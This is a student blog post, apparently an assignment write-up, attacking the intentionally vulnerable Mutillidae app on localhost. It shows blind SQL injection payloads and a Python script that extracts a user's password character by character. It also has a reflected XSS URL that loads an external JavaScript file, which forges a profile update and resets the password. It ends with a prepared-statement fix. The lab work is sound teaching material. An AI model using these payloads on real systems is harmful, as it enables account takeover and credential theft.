<!DOCTYPE html>
<html lang="en">
<head>
	<!--pjax: don't stop the music-->
  <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script>
  
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"rdweirdo981.github.io","root":"/","images":"/images","scheme":"Pisces","version":"8.1.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
  </script>
<meta name="description" content="This report is related to FIT5003 2020S2 Assignment 2. The main aspects that this assignment reviews are SQL injection, Cross-site Scripting, and Cross-site request forgery.">
<meta property="og:type" content="article">
<meta property="og:title" content="FIT5003 Assignment 2 - SQLi, XSS, and CSRF in OWASP2017">
<meta property="og:url" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/index.html">
<meta property="og:site_name" content="Random Weirdo">
<meta property="og:description" content="This report is related to FIT5003 2020S2 Assignment 2. The main aspects that this assignment reviews are SQL injection, Cross-site Scripting, and Cross-site request forgery.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/1.jpg">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/2.jpg">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/3.jpg">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/4.jpg">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/5.png">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/6.png">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/7.png">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/8.png">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/9.png">
<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/10.png">
<meta property="article:published_time" content="2021-01-22T08:23:22.000Z">
<meta property="article:modified_time" content="2021-02-07T17:09:42.407Z">
<meta property="article:author" content="Daisy">
<meta property="article:tag" content="SQLi">
<meta property="article:tag" content="XSS">
<meta property="article:tag" content="CSRF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/1.jpg">


<link rel="canonical" href="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/">


<script data-pjax class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>
<title>FIT5003 Assignment 2 - SQLi, XSS, and CSRF in OWASP2017 | Random Weirdo</title>
  



  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>


<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Random Weirdo</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
		<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1649082&auto=1&height=66"></iframe>
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <section class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Assignment-Requirements"><span class="nav-number">1.</span> <span class="nav-text">Assignment Requirements</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task-1-%E2%80%93-SQL-injection"><span class="nav-number">2.</span> <span class="nav-text">Task 1 – SQL injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-1-Approach-to-the-SQL-statement"><span class="nav-number">2.1.</span> <span class="nav-text">Step 1: Approach to the SQL statement</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-2-Understanding-POST-request"><span class="nav-number">2.2.</span> <span class="nav-text">Step 2: Understanding POST request</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-3-Writing-the-code"><span class="nav-number">2.3.</span> <span class="nav-text">Step 3: Writing the code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-4-Result"><span class="nav-number">2.4.</span> <span class="nav-text">Step 4: Result</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Appendx-1"><span class="nav-number">2.5.</span> <span class="nav-text">Appendx.1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task-2-%E2%80%93-XSS-injection"><span class="nav-number">3.</span> <span class="nav-text">Task 2 – XSS injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-1-Get-the-url"><span class="nav-number">3.1.</span> <span class="nav-text">Step 1: Get the url</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-2-Close-the-proxy"><span class="nav-number">3.2.</span> <span class="nav-text">Step 2: Close the proxy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-3-Writing-JavaScript-file"><span class="nav-number">3.3.</span> <span class="nav-text">Step 3: Writing JavaScript file</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-4-Perform-the-attack"><span class="nav-number">3.4.</span> <span class="nav-text">Step 4: Perform the attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step5-The-URL"><span class="nav-number">3.5.</span> <span class="nav-text">Step5: The URL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Appendix-2"><span class="nav-number">3.6.</span> <span class="nav-text">Appendix.2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task-3-%E2%80%93-Fixing-the-vulnerability"><span class="nav-number">4.</span> <span class="nav-text">Task 3 – Fixing the vulnerability</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-1-Understanding-PHP"><span class="nav-number">4.1.</span> <span class="nav-text">Step 1: Understanding PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-2-Implement-the-Protection"><span class="nav-number">4.2.</span> <span class="nav-text">Step 2: Implement the Protection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-3-Test-If-It-Works"><span class="nav-number">4.3.</span> <span class="nav-text">Step 3: Test If It Works</span></a></li></ol></li></ol></div>
        </section>
        <!--/noindex-->

        <section class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Daisy"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Daisy</p>
  <div class="site-description" itemprop="description">Notes about cybersecurity, mathematics, and anything else.</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



        </section>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://rdweirdo981.github.io/2021/01/22/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%202/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Daisy">
      <meta itemprop="description" content="Notes about cybersecurity, mathematics, and anything else.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Random Weirdo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          FIT5003 Assignment 2 - SQLi, XSS, and CSRF in OWASP2017
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-01-22 16:23:22" itemprop="dateCreated datePublished" datetime="2021-01-22T16:23:22+08:00">2021-01-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-02-08 01:09:42" itemprop="dateModified" datetime="2021-02-08T01:09:42+08:00">2021-02-08</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Master-of-Cybersecurity/" itemprop="url" rel="index"><span itemprop="name">Master of Cybersecurity</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Master-of-Cybersecurity/FIT5003/" itemprop="url" rel="index"><span itemprop="name">FIT5003</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <center> This report is related to FIT5003 2020S2 Assignment 2. The main aspects that this assignment reviews are SQL injection, Cross-site Scripting, and Cross-site request forgery.</center>


<a id="more"></a>
<br>

<h1 id="Assignment-Requirements"><a href="#Assignment-Requirements" class="headerlink" title="Assignment Requirements"></a>Assignment Requirements</h1><p>You can find it in: <a target="_blank" rel="noopener" href="https://github.com/RdWeirdo981/Master-of-Cybersecurity">https://github.com/RdWeirdo981/Master-of-Cybersecurity</a></p>
<h1 id="Task-1-–-SQL-injection"><a href="#Task-1-–-SQL-injection" class="headerlink" title="Task 1 – SQL injection"></a>Task 1 – SQL injection</h1><p>My username: user8069</p>
<h2 id="Step-1-Approach-to-the-SQL-statement"><a href="#Step-1-Approach-to-the-SQL-statement" class="headerlink" title="Step 1: Approach to the SQL statement"></a>Step 1: Approach to the SQL statement</h2><p>The first thing that I want to make sure is that if I can use an SQL statement to test whether my username exists. So, I enter the following line and click login.</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' OR substr(username, 1, 8)='user8069' <span class="comment">-- </span></span><br></pre></td></tr></tbody></table></figure>

<p> Note: There should be <strong>always</strong> a space after “–”</p>
<p>It worked! Thus, my username does exist. Furthermore, I can simply append another <code>substr()</code> comparison statement after this one to test the password that is assigned to my username.</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' OR (substr(username, 1, 8)='user8069' AND substr(password,i,1)= 'j') <span class="comment">--    </span></span><br></pre></td></tr></tbody></table></figure>

<p>Notice:  </p>
<ol>
<li>We do not need to encode the input to the ASCII format. This is because we are using a POST request rather than GET. </li>
</ol>
<h2 id="Step-2-Understanding-POST-request"><a href="#Step-2-Understanding-POST-request" class="headerlink" title="Step 2: Understanding POST request"></a>Step 2: Understanding POST request</h2><p><code>GET()</code> method requires the parameters added in the url, while POST() requires the parameters as some values and send them to the url. I use the following code to test if a known username&amp;password pair can be sent by my code.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = {<span class="string">'username'</span>:<span class="string">"john"</span>,<span class="string">'password'</span>:<span class="string">"monkey"</span>,<span class="string">'login-php-submit-button'</span>:<span class="string">"Login"</span>}</span><br></pre></td></tr></tbody></table></figure>

<p>And the HTTP history in BRUP is the same as we directly input username &amp; password.</p>
<h2 id="Step-3-Writing-the-code"><a href="#Step-3-Writing-the-code" class="headerlink" title="Step 3: Writing the code"></a>Step 3: Writing the code</h2><p>I changed the input in data variable in my python code, and created a python file to demonstrate the attack, and it worked.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = {<span class="string">'username'</span>:<span class="string">"' OR (substr(username, 1, 8)='user8069' AND substr(password,{},1)='{}') -- "</span>.<span class="built_in">format</span>(i,j),<span class="string">'password'</span>:<span class="string">""</span>,<span class="string">'login-php-submit-button'</span>:<span class="string">"Login"</span>}</span><br></pre></td></tr></tbody></table></figure>

<p>Notice: </p>
<ol>
<li><p><code>substr(password,i,1)=0</code> will get successful anyway!! In our code, we should exclude integer 0 and finally consider it. (or we don’t. I deleted the 0 protection in my code since all the values of j from printable are quoted by ‘’. But in case any further condition being added, we should always consider this.)</p>
</li>
<li><p><code>substr(password,{},1)={}</code> is not right!!! Since the input should be quoted as a string. I started with “= {} “, which gave me plenty of 0 as returns. This is because we have to make this an SQL statement. If the ‘’ is missing, and when j is an integer, the SQL will read it as an integer.</p>
</li>
<li><p>I noticed that there’s no difference between uppercase &amp; lowercase, so the same alphabetic letter will return twice. Just simple remove it. (Worthy of trying to use python code to remove it, but I’m too lazy.)</p>
</li>
</ol>
<h2 id="Step-4-Result"><a href="#Step-4-Result" class="headerlink" title="Step 4: Result"></a>Step 4: Result</h2><p><img src="1.jpg"></p>
<p><img src="2.jpg"></p>
<p>Username: user8069</p>
<p>Password: cgwqu12hqzinfoaxjeo8</p>
<p>The related python file has been attached in the “other file” submission box. It is also added in the python file.</p>
<h2 id="Appendx-1"><a href="#Appendx-1" class="headerlink" title="Appendx.1"></a>Appendx.1</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	<span class="keyword">import</span> requests  </span><br><span class="line"><span class="number">2.</span>	<span class="keyword">import</span> string  </span><br><span class="line"><span class="number">3.</span>	  </span><br><span class="line"><span class="number">4.</span>	proxy = {<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8080'</span>,<span class="string">'https'</span>:<span class="string">'http://127.0.0.1:8080'</span>}  </span><br><span class="line"><span class="number">5.</span>	  </span><br><span class="line"><span class="number">6.</span>	<span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>  </span><br><span class="line"><span class="number">7.</span>	      </span><br><span class="line"><span class="number">8.</span>	    url=<span class="string">"http://127.0.0.1/mutillidae/index.php?page=login.php"</span>  </span><br><span class="line"><span class="number">9.</span>	    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">25</span>):   </span><br><span class="line"><span class="number">10.</span>	    <span class="comment"># in case our password is longer than 20. We can actually write something like password.length to control the loop, but since the password is stored in database, it will cost some times to approach to it. So I will simply use a relative long range.  </span></span><br><span class="line"><span class="number">11.</span>	        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:  </span><br><span class="line"><span class="number">12.</span>	            data = {<span class="string">'username'</span>:<span class="string">"' OR (substr(username, 1, 8)='user8069' AND substr(password,{},1)='{}') -- "</span>.<span class="built_in">format</span>(i,j),<span class="string">'password'</span>:<span class="string">""</span>,<span class="string">'login-php-submit-button'</span>:<span class="string">"Login"</span>}  </span><br><span class="line"><span class="number">13.</span>	            r = requests.post(url,data,proxies=proxy,allow_redirects=<span class="literal">False</span>)  </span><br><span class="line"><span class="number">14.</span>	            <span class="keyword">if</span> r.status_code == <span class="number">302</span>:  </span><br><span class="line"><span class="number">15.</span>	                print(j)  </span><br><span class="line"><span class="number">16.</span>	        print(<span class="string">"this is "</span> + <span class="built_in">str</span>(i) + <span class="string">"rounds"</span>)  </span><br><span class="line"><span class="number">17.</span>	<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:  </span><br><span class="line"><span class="number">18.</span>	    main()  </span><br></pre></td></tr></tbody></table></figure>



<h1 id="Task-2-–-XSS-injection"><a href="#Task-2-–-XSS-injection" class="headerlink" title="Task 2 – XSS injection"></a>Task 2 – XSS injection</h1><p>Notice: when no login à user does not exist à can’t edit profile</p>
<p>So, we can only change the existed users’ profile, which is our user account.</p>
<h2 id="Step-1-Get-the-url"><a href="#Step-1-Get-the-url" class="headerlink" title="Step 1: Get the url"></a>Step 1: Get the url</h2><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"The ultimate question of  life the universe and everything."</span>)&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="3.jpg"></p>
<p><img src="4.jpg"></p>
<p>In BURP, sending the HTTP history of this POST request to <strong>Repeater</strong> and change the method to GET will bring us the following URL:</p>
<p>GET <a target="_blank" rel="noopener" href="http://127.0.0.1/mutillidae/index.php?page=dns-lookup.php&amp;target_host=alert(%22The+ultimate+question+of+life+the+universe+and+everything.%22)%3C/script%3E&amp;dns-lookup-php-submit-button=Lookup+DNS">http://127.0.0.1/mutillidae/index.php?page=dns-lookup.php&amp;target_host=%3Cscript%3Ealert%28%22The+ultimate+question+of+life+the+universe+and+everything.%22%29%3C%2Fscript%3E&amp;dns-lookup-php-submit-button=Lookup+DNS</a></p>
<p>We will change the highlighted part later.</p>
<h2 id="Step-2-Close-the-proxy"><a href="#Step-2-Close-the-proxy" class="headerlink" title="Step 2: Close the proxy"></a>Step 2: Close the proxy</h2><p>We have to change the proxy setting in Firefox to be “No proxy” to perform the attack.</p>
<p><img src="5.png"></p>
<p>If we don’t do this, when we access 127.0.0.1:9090, the browser will be re-directed to the XAMPP dashboard. </p>
<h2 id="Step-3-Writing-JavaScript-file"><a href="#Step-3-Writing-JavaScript-file" class="headerlink" title="Step 3: Writing JavaScript file"></a>Step 3: Writing JavaScript file</h2><p>The consultation video suggested that we can start from the resetDB.js. It is obvious that we should change the GET request to POST, but like in task 1, the POST request will send the data as a whole package. So, I observed the parameter in Edit Profile when I request a normal POST on the edit profile page. This is also why we need an authenticated account. If we can’t observe the POST request’s parameters, we will not know how to structure our data in JS. </p>
<p><img src="6.png"></p>
<p>I found this link is very useful: <a target="_blank" rel="noopener" href="https://javascript.info/xmlhttprequest#post-formdata">https://javascript.info/xmlhttprequest#post-formdata</a> </p>
<p>So, I used formdata in my POST request rather than filling send() directly with <code>“csrf-token=&amp;username=…”</code> stuffs. The completed code is in js file.</p>
<h2 id="Step-4-Perform-the-attack"><a href="#Step-4-Perform-the-attack" class="headerlink" title="Step 4: Perform the attack"></a>Step 4: Perform the attack</h2><p>After starting our attacker’s server, we now enter this script:</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"http://127.0.0.1:9090/resetPW.js"</span>&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>I wrote the alert at the end of the js file for convenience to test if it worked, since we cannot check the BURP (the proxy is closed.). But we still need to see if the profile has been changed. I have already reset the database before I did this attack, so if the password=42 is correct, then this attack can be seen as successful. </p>
<p><img src="7.png"></p>
<p>Done!</p>
<h2 id="Step5-The-URL"><a href="#Step5-The-URL" class="headerlink" title="Step5: The URL"></a>Step5: The URL</h2><p>There is still one thing to do: get the url. So we replace the previous GET url with our script, then it should be all settled. We will get the same result as in Step 4. (And we did.)</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/mutillidae/index.php?page=dns-lookup.php&amp;target_host=alert(%22The+ultimate+question+of+life+the+universe+and+everything.%22)%3C/script%3E&amp;dns-lookup-php-submit-button=Lookup+DNS">http://127.0.0.1/mutillidae/index.php?page=dns-lookup.php&amp;target_host=%3Cscript+src%3D%22http%3A%2F%2F127.0.0.1%3A9090%2FresetPW.js%22%3E&amp;dns-lookup-php-submit-button=Lookup+DNS</a></p>
<p>Notice: this should be encoded since it’s a URL. </p>
<h2 id="Appendix-2"><a href="#Appendix-2" class="headerlink" title="Appendix.2"></a>Appendix.2</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	<span class="function"><span class="keyword">function</span> <span class="title">resetPW</span>(<span class="params"></span>) </span>{   </span><br><span class="line"><span class="number">2.</span>	    <span class="keyword">var</span> url = <span class="string">"http://127.0.0.1/mutillidae/index.php?page=edit-account-profile.php"</span>;   </span><br><span class="line"><span class="number">3.</span>	    xhr = <span class="keyword">new</span> XMLHttpRequest();   </span><br><span class="line"><span class="number">4.</span>	    xhr.open(<span class="string">"POST"</span>, url);   </span><br><span class="line"><span class="number">5.</span>	      </span><br><span class="line"><span class="number">6.</span>	    <span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();  </span><br><span class="line"><span class="number">7.</span>	    formData.append(<span class="string">"csrf-token"</span>, <span class="string">""</span>);  </span><br><span class="line"><span class="number">8.</span>	    formData.append(<span class="string">"username"</span>,<span class="string">"user8069"</span>);  </span><br><span class="line"><span class="number">9.</span>	    formData.append(<span class="string">"password"</span>, <span class="string">"42"</span>);  </span><br><span class="line"><span class="number">10.</span>	    formData.append(<span class="string">"confirm_password"</span>,<span class="string">"42"</span>);  </span><br><span class="line"><span class="number">11.</span>	    formData.append(<span class="string">"my_signature"</span>,<span class="string">"You have been hacked."</span>);  </span><br><span class="line"><span class="number">12.</span>	    formData.append(<span class="string">"edit-account-profile-php-submit-button"</span>,<span class="string">"Update Profile"</span>);  </span><br><span class="line"><span class="number">13.</span>	    xhr.send(formData);  </span><br><span class="line"><span class="number">14.</span>	}  </span><br><span class="line"><span class="number">15.</span>	resetPW();  </span><br><span class="line"><span class="number">16.</span>	alert(<span class="string">"PHP is the best language in the world."</span>);  </span><br></pre></td></tr></tbody></table></figure>

<h1 id="Task-3-–-Fixing-the-vulnerability"><a href="#Task-3-–-Fixing-the-vulnerability" class="headerlink" title="Task 3 – Fixing the vulnerability"></a>Task 3 – Fixing the vulnerability</h1><h2 id="Step-1-Understanding-PHP"><a href="#Step-1-Understanding-PHP" class="headerlink" title="Step 1: Understanding PHP"></a>Step 1: Understanding PHP</h2><p>I have not learnt PHP before so I spend some times on studying it. For this part, the material that I used to learn PHP are:</p>
<p><a target="_blank" rel="noopener" href="https://www.w3schools.com/php/php_ref_mysqli.asp">https://www.w3schools.com/php/php_ref_mysqli.asp</a> , our week8 lecture.</p>
<h2 id="Step-2-Implement-the-Protection"><a href="#Step-2-Implement-the-Protection" class="headerlink" title="Step 2: Implement the Protection"></a>Step 2: Implement the Protection</h2><p>The protection code can be seen in both PHP files. They are a bit long so I don’t attach them in appendix. But you can see them in the “other file” submission.</p>
<ol>
<li>In <code>SQLQueryHandler.php</code>: you will find the fixed code in <code>authenticateAccount()</code> and <code>getUserAccount()</code>. I deleted the original query and made a <code>defendSQLI()</code> function in another file to pass the query.</li>
</ol>
<p><img src="8.png"></p>
<ol start="2">
<li>In <code>MySQLHandler.php</code>, I implement the protection by writing a new function <code>defendSQLI()</code>. The following is the main code of it. I configured the code of week8 lecture. </li>
</ol>
<p><img src="9.png"></p>
<p>Notice: </p>
<ol>
<li><p>I thought I can implement it only in the <code>authenticateAccount()</code> initially, but the website still had zero protection. So, I thought maybe it’s the same thing in the other function. It turned out it truly is.</p>
</li>
<li><p>I struggled for a long while with where I can put this <code>$stmt</code> things. Initially I thought I can put it in <code>doExecute()</code>, but I found that the <code>doExexute()</code> only accepts query. So, I just wrote a new function by myself.</p>
</li>
<li><p>I was stuck on how to connect to the database as well, since I have no experience on writing PHP code. But I observed the code in this file and found the <code>mMySQLConnection</code> will create the database connection in <code>doConnectToDatabase()</code>. So, I guess we should use <code>$this-&gt;$mMySQLConnection</code> rather than <code>$mysqli</code>.</p>
</li>
</ol>
<h2 id="Step-3-Test-If-It-Works"><a href="#Step-3-Test-If-It-Works" class="headerlink" title="Step 3: Test If It Works"></a>Step 3: Test If It Works</h2><p>Initially, I did not succeed on this task. I used the code that was provided in our week8 lecture, but I made a stupid mistake: when I was writing the query of prepare() function, I forget to pass the <code>password = ?</code>, and I wrote <code>bind_param(“ss”,$un, $pw)</code> in the next line, so it caused the website totally crashed.</p>
